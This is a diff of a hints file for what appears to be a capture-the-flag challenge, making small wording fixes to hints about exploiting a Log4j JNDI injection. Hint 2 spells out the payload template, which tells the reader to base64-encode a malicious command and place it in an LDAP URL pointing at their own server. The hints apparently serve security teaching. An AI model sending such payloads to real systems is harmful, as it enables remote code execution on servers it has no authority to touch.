@@ -2,11 +2,11 @@
 
 ### HINT 1
 
-/Basic/Command/Base64 might be a hint! And the challenge said to "encode"... hmm.....
+/Basic/Command/Base64 might be a hint! And the challenge said to "encode"… hmm……
 
 ### HINT 2
 
-You need to encode the malicious command as base64, and add it to the ldap url. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn’t working for you, triple-check to make sure that you have encoded the malicious command correctly.
+You need to encode the malicious command as base64, and add it to the ldap URL. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn’t working for you, triple-check to make sure that you have encoded the malicious command correctly.
 
 ### HINT 3
 
